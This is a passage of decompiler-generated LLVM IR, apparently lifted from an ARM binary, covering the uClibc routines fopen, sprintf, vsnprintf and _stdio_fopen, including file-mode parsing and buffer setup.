  %v1_fcb0 = icmp slt i32 %v1_fc84, 0
  store i32 %v4_fca8, i32* %stack_var_-80, align 4
  br i1 %v1_fcb0, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_fca8)
  %v0_fcd8 = load i32, i32* @r6, align 4
  %v2_fcd8 = add i32 %v0_fcd8, 16
  %v3_fcd8 = inttoptr i32 %v2_fcd8 to i32*
  %v4_fcd8 = load i32, i32* %v3_fcd8, align 4
  call void @__pseudo_branch(i32 %v4_fcd8)
  %v0_fce8 = load i32, i32* @r6, align 4
  %v2_fce8 = add i32 %v0_fce8, 12
  %v3_fce8 = inttoptr i32 %v2_fce8 to i32*
  %v4_fce8 = load i32, i32* %v3_fce8, align 4
  %v1_fcec = inttoptr i32 %v4_fce8 to i32*
  %v2_fcec = load i32, i32* %v1_fcec, align 4
  %v1_fcf4 = add i32 %v2_fcec, 1
  %v2_fcf8 = add i32 %v0_fce8, 24
  %v3_fcf8 = inttoptr i32 %v2_fcf8 to i32*
  %v4_fcf8 = load i32, i32* %v3_fcf8, align 4
  store i32 %v4_fcf8, i32* @r4, align 4
  store i32 %v1_fcf4, i32* %v1_fcec, align 4
  call void @__pseudo_branch(i32 %v4_fcf8)
  %v0_fd10 = load i32, i32* @r5, align 4
  %v1_fd10 = inttoptr i32 %v0_fd10 to i16*
  %v2_fd10 = load i16, i16* %v1_fd10, align 2
  %v1_fd14 = and i16 %v2_fd10, 24576
  %v1_fd18 = or i16 %v1_fd14, 48
  %v0_fd1c = load i32, i32* %sb.global-to-local, align 4
  %v2_fd1c = icmp eq i32 %v0_fd1c, 0
  store i16 %v1_fd18, i16* %v1_fd10, align 2
  br i1 %v2_fd1c, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_fd30 = xor i1 %v2_fd1c, true
  call void @__pseudo_cond_branch(i1 %v2_fd30, i32 %v4_fcf8)
  %v0_fd34 = load i32, i32* @r5, align 4
  %v1_fd34 = inttoptr i32 %v0_fd34 to i16*
  %v2_fd34 = load i16, i16* %v1_fd34, align 2
  %v1_fd38 = and i16 %v2_fd34, 16384
  %v2_fd38 = icmp eq i16 %v1_fd38, 0
  br i1 %v2_fd38, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_fd40 = xor i1 %v2_fd38, true
  call void @__pseudo_cond_branch(i1 %v1_fd40, i32 ptrtoint (i32* @global_var_1375c.598 to i32))
  %v2_fd4c = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_fd4c)
  call void @__pseudo_branch(i32 %v4_fcd8)
  %v0_fd6c = load i32, i32* @r6, align 4
  %v2_fd6c = add i32 %v0_fd6c, 52
  %v3_fd6c = inttoptr i32 %v2_fd6c to i32*
  %v4_fd6c = load i32, i32* %v3_fd6c, align 4
  %v1_fd70 = inttoptr i32 %v4_fd6c to i32*
  %v2_fd70 = load i32, i32* %v1_fd70, align 4
  %v1_fd74 = add i32 %v2_fd70, 1
  store i32 %v1_fd74, i32* %v1_fd70, align 4
  call void @__pseudo_branch(i32 %v4_fcf8)
  %v0_fd8c = call i32 @_stdio_openlist_dec_use()
  %v0_fd90 = load i32, i32* %sl.global-to-local, align 4
  %v2_fd98 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_fd98, i32* @r4, align 4
  store i32 %v6_fc0c, i32* @r5, align 4
  store i32 %v9_fc0c, i32* @r6, align 4
  store i32 %v12_fc0c, i32* @r7, align 4
  store i32 %v15_fc0c, i32* @r8, align 4
  store i32 %v27_fc0c, i32* @lr, align 4
  ret i32 %v0_fd90

; uselistorder directives
  uselistorder i1 %v2_fd38, { 1, 0 }
  uselistorder i32 %v4_fcf8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_fc18, { 1, 0 }
  uselistorder i32 %v4_fc10, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_fc6c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_fda4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fda4:
  %v0_fda4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fda4, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_fda4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_fda4, %bb
  %v10_fdbc = phi i32 [ %arg1, %dec_label_pc_fda4 ], [ 0, %bb ]
  ret i32 %v10_fdbc

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fdd0 = call i32 @_stdio_fopen()
  ret i32 %v0_fdd0
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fdec = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fdec, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fe00 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fe00

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_fe14 = load i32, i32* @r4, align 4
  %v6_fe14 = load i32, i32* @r5, align 4
  %v9_fe14 = load i32, i32* @r6, align 4
  %v12_fe14 = load i32, i32* @r7, align 4
  %v18_fe14 = load i32, i32* @sl, align 4
  %v2_fe1c = ptrtoint i32* %stack_var_-112 to i32
  %v0_fe20 = load i32, i32* @r0, align 4
  store i32 %v0_fe20, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_fe28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_fe28, i32* @r0, align 4
  %v0_fe30 = load i32, i32* @r3, align 4
  store i32 %v0_fe30, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_fe3c = load i32, i32* @r1, align 4
  store i32 %v0_fe3c, i32* @r5, align 4
  %v0_fe40 = load i32, i32* @r2, align 4
  store i32 %v0_fe40, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_fe54 = call i32 @__stdio_init_mutex(i32 %v2_fe28)
  %v0_fe58 = load i32, i32* @r4, align 4
  %v1_fe58 = sub i32 -1, %v0_fe58
  %v0_fe5c = load i32, i32* @r5, align 4
  %v3_fe5c = icmp ult i32 %v0_fe5c, %v1_fe58
  br i1 %v3_fe5c, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fe58, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_fe64 = phi i32 [ %v0_fe5c, %entry ], [ %v1_fe58, %bb ]
  %v2_fe64 = add i32 %v1_fe64, %v0_fe58
  %v0_fe6c = load i32, i32* @r6, align 4
  %v0_fe70 = load i32, i32* @r7, align 4
  %v0_fe7c = load i32, i32* @sl, align 4
  %v5_fe88 = inttoptr i32 %v0_fe58 to i8*
  %v15_fe90 = inttoptr i32 %v0_fe6c to i8*
  %v16_fe90 = call i32 @_vfprintf_internal(i32 %v2_fe1c, i8* %v15_fe90, i32 %v0_fe70, i32 %v2_fe64, i32 %v0_fe58, i32 %v2_fe64, i32 %v0_fe58, i32 %v0_fe58, i32 %v0_fe58, i32 %v2_fe64, i32 %v0_fe7c)
  %v0_fe94 = load i32, i32* @r5, align 4
  %v1_fe94 = load i32, i32* @sl, align 4
  %v9_fe94 = icmp eq i32 %v0_fe94, %v1_fe94
  br i1 %v9_fe94, label %dec_label_pc_febc, label %dec_label_pc_fea0

dec_label_pc_fea0:                                ; preds = %bb26
  %v3_fe64 = inttoptr i32 %v2_fe64 to i8*
  %v9_fea8 = icmp eq i8* %v5_fe88, %v3_fe64
  br i1 %v9_fea8, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_fea0
  %v2_feac = add i32 %v0_fe58, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_fea0, %bb27
  %v1_feb0 = phi i32 [ %v2_fe64, %dec_label_pc_fea0 ], [ %v2_feac, %bb27 ]
  %v6_feb0 = inttoptr i32 %v1_feb0 to i8*
  %stack_var_-96.0 = select i1 %v9_fea8, i8* %v6_feb0, i8* %v5_fe88
  %v1_feb8 = trunc i32 %v1_fe94 to i8
  store i8 %v1_feb8, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %bb26, %bb28
  store i32 %v3_fe14, i32* @r4, align 4
  store i32 %v6_fe14, i32* @r5, align 4
  store i32 %v9_fe14, i32* @r6, align 4
  store i32 %v12_fe14, i32* @r7, align 4
  store i32 %v18_fe14, i32* @sl, align 4
  ret i32 %v16_fe90

; uselistorder directives
  uselistorder i32 %v2_fe64, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_fe58, { 2, 1, 0 }
  uselistorder i32 %v0_fe58, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder label %dec_label_pc_febc, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fec8 = load i32, i32* @r4, align 4
  store i32 %v3_fec8, i32* %stack_var_-36, align 4
  %v6_fec8 = load i32, i32* @r5, align 4
  %v9_fec8 = load i32, i32* @r6, align 4
  %v18_fec8 = load i32, i32* @sb, align 4
  %v24_fec8 = load i32, i32* @fp, align 4
  %v0_fecc = load i32, i32* @r1, align 4
  %v1_fecc = inttoptr i32 %v0_fecc to i8*
  %v2_fecc = load i8, i8* %v1_fecc, align 1
  %v3_fecc = zext i8 %v2_fecc to i32
  store i32 %v3_fecc, i32* @ip, align 4
  %v7_fed4 = icmp eq i8 %v2_fecc, 114
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @fp, align 4
  %v2_fedc = ptrtoint i32* %stack_var_-72 to i32
  %v0_fee0 = load i32, i32* @r0, align 4
  store i32 %v0_fee0, i32* @r6, align 4
  %v0_fee4 = load i32, i32* @r2, align 4
  store i32 %v0_fee4, i32* @sb, align 4
  %v0_fee8 = load i32, i32* @r3, align 4
  store i32 %v0_fee8, i32* @r5, align 4
  br i1 %v7_fed4, label %dec_label_pc_ff34, label %dec_label_pc_fef0

dec_label_pc_fef0:                                ; preds = %entry
  %v7_fef0 = icmp eq i8 %v2_fecc, 119
  br i1 %v7_fef0, label %bb, label %dec_label_pc_fefc

bb:                                               ; preds = %dec_label_pc_fef0
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_ff38

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fef0
  %v7_fefc = icmp eq i8 %v2_fecc, 97
  br i1 %v7_fefc, label %bb34, label %dec_label_pc_ff08

bb34:                                             ; preds = %dec_label_pc_fefc
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_ff38

dec_label_pc_ff08:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_ffbc, %dec_label_pc_ff90
  %v0_ff08 = call i32 @__GI___errno_location()
  store i32 %v0_ff08, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_ff10 = load i32, i32* @sb, align 4
  %v2_ff10 = icmp eq i32 %v0_ff10, 0
  %v2_ff14 = inttoptr i32 %v0_ff08 to i32*
  store i32 22, i32* %v2_ff14, align 4
  br i1 %v2_ff10, label %dec_label_pc_10188, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ffe0._crit_edge, %dec_label_pc_ff08
  %v0_ff1c = load i32, i32* @sb, align 4
  %v1_ff1c = inttoptr i32 %v0_ff1c to i16*
  %v2_ff1c = load i16, i16* %v1_ff1c, align 2
  %v3_ff1c = zext i16 %v2_ff1c to i32
  store i32 %v3_ff1c, i32* %r3.global-to-local, align 4
  %v1_ff20 = and i32 %v3_ff1c, 8192
  %v2_ff20 = icmp eq i32 %v1_ff20, 0
  br i1 %v2_ff20, label %dec_label_pc_10188, label %dec_label_pc_ff28

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff1c
  store i32 %v0_ff1c, i32* @r0, align 4
  %v0_ff2c = call i32 @free()
  store i32 %v0_ff2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10188

dec_label_pc_ff34:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %bb, %bb34, %dec_label_pc_ff34
  %v1_ff50 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_ff34 ]
  %v1_ff38 = add i32 %v0_fecc, 1
  %v2_ff38 = inttoptr i32 %v1_ff38 to i8*
  %v3_ff38 = load i8, i8* %v2_ff38, align 1
  %v7_ff3c = icmp eq i8 %v3_ff38, 98
  %v1_ff38.v0_fecc = select i1 %v7_ff3c, i32 %v1_ff38, i32 %v0_fecc
  store i32 %v1_ff38.v0_fecc, i32* %r3.global-to-local, align 4
  %v1_ff48 = add i32 %v1_ff38.v0_fecc, 1
  %v2_ff48 = inttoptr i32 %v1_ff48 to i8*
  %v3_ff48 = load i8, i8* %v2_ff48, align 1
  %v4_ff48 = zext i8 %v3_ff48 to i32
  store i32 %v4_ff48, i32* @r3, align 4
  %v7_ff4c = icmp eq i8 %v3_ff48, 43
  br i1 %v7_ff4c, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_ff38
  store i32 %v1_ff50, i32* @r3, align 4
  %v2_ff54 = add nuw nsw i32 %v1_ff50, 1
  store i32 %v2_ff54, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_ff38, %bb37
  %v2_ff58 = icmp eq i32 %v0_fee4, 0
  br i1 %v2_ff58, label %dec_label_pc_ff60, label %dec_label_pc_ff88

dec_label_pc_ff60:                                ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_ff64 = call i32 @malloc(i32 80)
  store i32 %v1_ff64, i32* %r0.global-to-local, align 4
  store i32 %v1_ff64, i32* @sb, align 4
  %v3_ff68 = icmp eq i32 %v1_ff64, 0
  br i1 %v3_ff68, label %dec_label_pc_1018c, label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_ff60
  %v2_ff74 = add i32 %v1_ff64, 8
  %v3_ff74 = inttoptr i32 %v2_ff74 to i32*
  store i32 0, i32* %v3_ff74, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_ff7c = load i32, i32* @sb, align 4
  %v3_ff7c = inttoptr i32 %v2_ff7c to i16*
  store i16 8192, i16* %v3_ff7c, align 2
  %v0_ff80 = load i32, i32* @sb, align 4
  %v1_ff80 = add i32 %v0_ff80, 56
  store i32 %v1_ff80, i32* @r0, align 4
  %v1_ff84 = call i32 @__stdio_init_mutex(i32 %v1_ff80)
  store i32 %v1_ff84, i32* %r0.global-to-local, align 4
  %v0_ff88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %.thread5, %dec_label_pc_ff70
  %v0_ffe0 = phi i32 [ %v0_fee8, %.thread5 ], [ %v0_ff88.pre, %dec_label_pc_ff70 ]
  %v1_ff88 = icmp slt i32 %v0_ffe0, 0
  br i1 %v1_ff88, label %dec_label_pc_ffe0, label %dec_label_pc_ff90

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff88
  %v0_ff94 = load i32, i32* @r4, align 4
  %v2_ff94 = and i32 %v0_ff94, 131075
  %v1_ff98 = add nuw nsw i32 %v2_ff94, 1
  store i32 %v1_ff98, i32* %r2.global-to-local, align 4
  %v0_ff9c = load i32, i32* @r6, align 4
  %v1_ff9c = add i32 %v0_ff9c, 1
  %v2_ffa0 = and i32 %v1_ff9c, %v1_ff98
  store i32 %v2_ffa0, i32* %r3.global-to-local, align 4
  %v9_ffa4 = icmp eq i32 %v2_ffa0, %v1_ff98
  %v1_ffa8 = load i32, i32* @sb, align 4
  %v2_ffa8 = add i32 %v1_ffa8, 4
  %v3_ffa8 = inttoptr i32 %v2_ffa8 to i32*
  store i32 %v0_ffe0, i32* %v3_ffa8, align 4
  br i1 %v9_ffa4, label %dec_label_pc_ffb0, label %dec_label_pc_ff08

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ff90
  %v0_ffb0 = load i32, i32* @r4, align 4
  %v1_ffb0 = load i32, i32* @r6, align 4
  %v2_ffb0 = sub i32 -1, %v1_ffb0
  %v3_ffb0 = and i32 %v0_ffb0, %v2_ffb0
  store i32 %v3_ffb0, i32* @r3, align 4
  %v1_ffb4 = and i32 %v3_ffb0, 1024
  %v2_ffb4 = icmp eq i32 %v1_ffb4, 0
  br i1 %v2_ffb4, label %dec_label_pc_ffd4, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ffb0
  %v0_ffbc = load i32, i32* @r5, align 4
  store i32 %v0_ffbc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_ffc8 = call i32 @__libc_fcntl(i32 %v0_ffbc, i32 4)
  store i32 %v2_ffc8, i32* %r0.global-to-local, align 4
  %v2_ffcc = icmp eq i32 %v2_ffc8, 0
  br i1 %v2_ffcc, label %dec_label_pc_ffbc.dec_label_pc_ffd4_crit_edge, label %dec_label_pc_ff08

dec_label_pc_ffbc.dec_label_pc_ffd4_crit_edge:    ; preds = %dec_label_pc_ffbc
  %v0_ffd4.pre = load i32, i32* @r6, align 4
  %v0_ffd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ffd4

dec_label_pc_ffd4:                                ; preds = %dec_label_pc_ffbc.dec_label_pc_ffd4_crit_edge, %dec_label_pc_ffb0
  %v0_ffd8 = phi i32 [ %v0_ffd8.pre, %dec_label_pc_ffbc.dec_label_pc_ffd4_crit_edge ], [ %v0_ffb0, %dec_label_pc_ffb0 ]
  %v0_ffd4 = phi i32 [ %v0_ffd4.pre, %dec_label_pc_ffbc.dec_label_pc_ffd4_crit_edge ], [ %v1_ffb0, %dec_label_pc_ffb0 ]
  %v1_ffd4 = and i32 %v0_ffd4, 131072
  store i32 %v1_ffd4, i32* %r3.global-to-local, align 4
  %v2_ffd8 = or i32 %v1_ffd4, %v0_ffd8
  store i32 %v2_ffd8, i32* @r4, align 4
  br label %dec_label_pc_10004

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ff88
  %v7_ffe0 = icmp eq i32 %v0_ffe0, -1
  %v0_ffec.pre = load i32, i32* @r4, align 4
  br i1 %v7_ffe0, label %dec_label_pc_ffe0._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_ffe0
  %v2_ffe4 = or i32 %v0_ffec.pre, 131072
  store i32 %v2_ffe4, i32* @r4, align 4
  br label %dec_label_pc_ffe0._crit_edge

dec_label_pc_ffe0._crit_edge:                     ; preds = %dec_label_pc_ffe0, %bb38
  %v0_ffec = phi i32 [ %v2_ffe4, %bb38 ], [ %v0_ffec.pre, %dec_label_pc_ffe0 ]
  %v0_ffe8 = load i32, i32* @r6, align 4
  store i32 %v0_ffe8, i32* %r0.global-to-local, align 4
  store i32 %v0_ffec, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_fff4 = call i32 @__GI_open(i32 %v0_ffe8, i32 %v0_ffec)
  store i32 %v2_fff4, i32* %r0.global-to-local, align 4
  %v1_fff8 = icmp slt i32 %v2_fff4, 0
  %v1_fffc = load i32, i32* @sb, align 4
  %v2_fffc = add i32 %v1_fffc, 4
  %v3_fffc = inttoptr i32 %v2_fffc to i32*
  store i32 %v2_fff4, i32* %v3_fffc, align 4
  br i1 %v1_fff8, label %dec_label_pc_ff1c, label %.dec_label_pc_10004_crit_edge

.dec_label_pc_10004_crit_edge:                    ; preds = %dec_label_pc_ffe0._crit_edge
  %v0_10008.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004

dec_label_pc_10004:                               ; preds = %.dec_label_pc_10004_crit_edge, %dec_label_pc_ffd4
  %v0_10020 = phi i32 [ %v0_10008.pre, %.dec_label_pc_10004_crit_edge ], [ %v2_ffd8, %dec_label_pc_ffd4 ]
  %v0_10004 = load i32, i32* @sb, align 4
  %v1_10004 = inttoptr i32 %v0_10004 to i16*
  %v2_10004 = load i16, i16* %v1_10004, align 2
  %v3_10004 = zext i16 %v2_10004 to i32
  %v1_10008 = urem i32 %v0_10020, 4
  %v1_1000c = and i32 %v0_10020, 1024
  %v1_10010 = and i32 %v3_10004, 8192
  %v1_10014 = add nuw nsw i32 %v1_10008, 1
  %v2_10018 = or i32 %v1_10010, %v1_1000c
  store i32 %v2_10018, i32* %r3.global-to-local, align 4
  %v1_1001c = xor i32 %v1_10014, 3
  store i32 %v1_1001c, i32* %r1.global-to-local, align 4
  %v1_10020 = and i32 %v0_10020, 131072
  store i32 %v1_10020, i32* %r2.global-to-local, align 4
  %v2_10020 = icmp eq i32 %v1_10020, 0
  %v1_10024 = add i32 %v0_10004, 4
  %v2_10024 = inttoptr i32 %v1_10024 to i32*
  %v3_10024 = load i32, i32* %v2_10024, align 4
  store i32 %v3_10024, i32* @r5, align 4
  br i1 %v2_10020, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_10004
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_10004, %bb39
  %v0_10030 = phi i32 [ 0, %dec_label_pc_10004 ], [ 32768, %bb39 ]
  %v4_1002c = mul nuw nsw i32 %v1_1001c, 16
  %v5_1002c = or i32 %v2_10018, %v4_1002c
  store i32 %v5_1002c, i32* %r3.global-to-local, align 4
  %v2_10030 = or i32 %v0_10030, %v5_1002c
  store i32 %v2_10030, i32* %r2.global-to-local, align 4
  %v8_10034 = icmp eq i32 %v3_10024, 2147483647
  %v1_10038 = trunc i32 %v2_10030 to i16
  store i16 %v1_10038, i16* %v1_10004, align 2
  br i1 %v8_10034, label %dec_label_pc_10068, label %dec_label_pc_10040

dec_label_pc_10040:                               ; preds = %bb40
  %v0_10040 = call i32 @__GI___errno_location()
  store i32 %v0_10040, i32* @r4, align 4
  %v0_10048 = load i32, i32* @r5, align 4
  store i32 %v0_10048, i32* @r0, align 4
  %v1_1004c = inttoptr i32 %v0_10040 to i32*
  %v2_1004c = load i32, i32* %v1_1004c, align 4
  store i32 %v2_1004c, i32* @r5, align 4
  %v1_10050 = call i32 @isatty(i32 %v0_10048)
  store i32 %v1_10050, i32* %r0.global-to-local, align 4
  %v2_10054 = icmp eq i32 %v1_10050, 0
  br i1 %v2_10054, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_10040
  %v1_10058 = load i32, i32* @sb, align 4
  %v2_10058 = inttoptr i32 %v1_10058 to i16*
  %v3_10058 = load i16, i16* %v2_10058, align 2
  %v4_10058 = zext i16 %v3_10058 to i32
  %v2_1005c = or i32 %v4_10058, 256
  store i32 %v2_1005c, i32* %r3.global-to-local, align 4
  %v2_10060 = trunc i32 %v2_1005c to i16
  store i16 %v2_10060, i16* %v2_10058, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10040, %bb41
  %v0_10064 = load i32, i32* @r5, align 4
  %v1_10064 = load i32, i32* @r4, align 4
  %v2_10064 = inttoptr i32 %v1_10064 to i32*
  store i32 %v0_10064, i32* %v2_10064, align 4
  br label %dec_label_pc_10068

dec_label_pc_10068:                               ; preds = %bb40, %.thread7
  %v0_10068 = load i32, i32* @sb, align 4
  %v1_10068 = add i32 %v0_10068, 8
  %v2_10068 = inttoptr i32 %v1_10068 to i32*
  %v3_10068 = load i32, i32* %v2_10068, align 4
  store i32 %v3_10068, i32* %r3.global-to-local, align 4
  %v2_1006c = icmp eq i32 %v3_10068, 0
  br i1 %v2_1006c, label %dec_label_pc_10074, label %bb42

dec_label_pc_10074:                               ; preds = %dec_label_pc_10068
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_10078 = call i32 @malloc(i32 4096)
  store i32 %v1_10078, i32* %r0.global-to-local, align 4
  %v2_1007c = icmp eq i32 %v1_10078, 0
  %v1_1008c.pre = load i32, i32* @sb, align 4
  br i1 %v2_1007c, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_10074
  %v2_10080 = inttoptr i32 %v1_1008c.pre to i16*
  %v3_10080 = load i16, i16* %v2_10080, align 2
  %v4_10080 = zext i16 %v3_10080 to i32
  %v2_10084 = add i32 %v1_10078, 4096
  store i32 %v2_10084, i32* %r2.global-to-local, align 4
  %v2_10088 = or i32 %v4_10080, 16384
  store i32 %v2_10088, i32* %r3.global-to-local, align 4
  %v2_1008c = add i32 %v1_1008c.pre, 8
  %v3_1008c = inttoptr i32 %v2_1008c to i32*
  store i32 %v1_10078, i32* %v3_1008c, align 4
  %v1_10090 = load i32, i32* %r2.global-to-local, align 4
  %v2_10090 = load i32, i32* @sb, align 4
  %v3_10090 = add i32 %v2_10090, 12
  %v4_10090 = inttoptr i32 %v3_10090 to i32*
  store i32 %v1_10090, i32* %v4_10090, align 4
  %v1_10094 = load i32, i32* %r3.global-to-local, align 4
  %v2_10094 = trunc i32 %v1_10094 to i16
  %v3_10094 = load i32, i32* @sb, align 4
  %v4_10094 = inttoptr i32 %v3_10094 to i16*
  store i16 %v2_10094, i16* %v4_10094, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_10074
  %v2_1008c21 = add i32 %v1_1008c.pre, 8
  %v3_1008c22 = inttoptr i32 %v2_1008c21 to i32*
  store i32 0, i32* %v3_1008c22, align 4
  %v2_10098 = load i32, i32* @sb, align 4
  %v3_10098 = add i32 %v2_10098, 12
  %v4_10098 = inttoptr i32 %v3_10098 to i32*
  store i32 0, i32* %v4_10098, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_10068, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100a4 = load i32, i32* @fp, align 4
  %v2_100a4 = add i32 %v0_100a4, 60
  %v3_100a4 = inttoptr i32 %v2_100a4 to i32*
  %v4_100a4 = load i32, i32* %v3_100a4, align 4
  store i32 %v4_100a4, i32* %r3.global-to-local, align 4
  %v2_100a8 = load i32, i32* @sb, align 4
  %v3_100a8 = add i32 %v2_100a8, 2
  %v4_100a8 = inttoptr i32 %v3_100a8 to i8*
  store i8 0, i8* %v4_100a8, align 1
  %v0_100ac = load i32, i32* @sb, align 4
  %v1_100ac = inttoptr i32 %v0_100ac to i16*
  %v2_100ac = load i16, i16* %v1_100ac, align 2
  %v3_100ac = zext i16 %v2_100ac to i32
  store i32 %v3_100ac, i32* %r2.global-to-local, align 4
  %v0_100b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100b0 = inttoptr i32 %v0_100b0 to i32*
  %v2_100b0 = load i32, i32* %v1_100b0, align 4
  store i32 %v2_100b0, i32* %r1.global-to-local, align 4
  %v1_100b4 = add i32 %v0_100ac, 8
  %v2_100b4 = inttoptr i32 %v1_100b4 to i32*
  %v3_100b4 = load i32, i32* %v2_100b4, align 4
  store i32 %v3_100b4, i32* %r3.global-to-local, align 4
  %v1_100b8 = and i32 %v3_100ac, 8192
  %v2_100b8 = icmp eq i32 %v1_100b8, 0
  %v2_100bc = add i32 %v0_100ac, 20
  %v3_100bc = inttoptr i32 %v2_100bc to i32*
  store i32 %v3_100b4, i32* %v3_100bc, align 4
  %v0_100c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100c0 = load i32, i32* @sb, align 4
  %v2_100c0 = add i32 %v1_100c0, 44
  %v3_100c0 = inttoptr i32 %v2_100c0 to i32*
  store i32 %v0_100c0, i32* %v3_100c0, align 4
  %v0_100c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_100c4 = load i32, i32* @sb, align 4
  %v2_100c4 = add i32 %v1_100c4, 52
  %v3_100c4 = inttoptr i32 %v2_100c4 to i32*
  store i32 %v0_100c4, i32* %v3_100c4, align 4
  %v0_100c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100c8 = load i32, i32* @sb, align 4
  %v2_100c8 = add i32 %v1_100c8, 24
  %v3_100c8 = inttoptr i32 %v2_100c8 to i32*
  store i32 %v0_100c8, i32* %v3_100c8, align 4
  %v0_100cc = load i32, i32* %r3.global-to-local, align 4
  %v1_100cc = load i32, i32* @sb, align 4
  %v2_100cc = add i32 %v1_100cc, 28
  %v3_100cc = inttoptr i32 %v2_100cc to i32*
  store i32 %v0_100cc, i32* %v3_100cc, align 4
  %v0_100d0 = load i32, i32* %r3.global-to-local, align 4
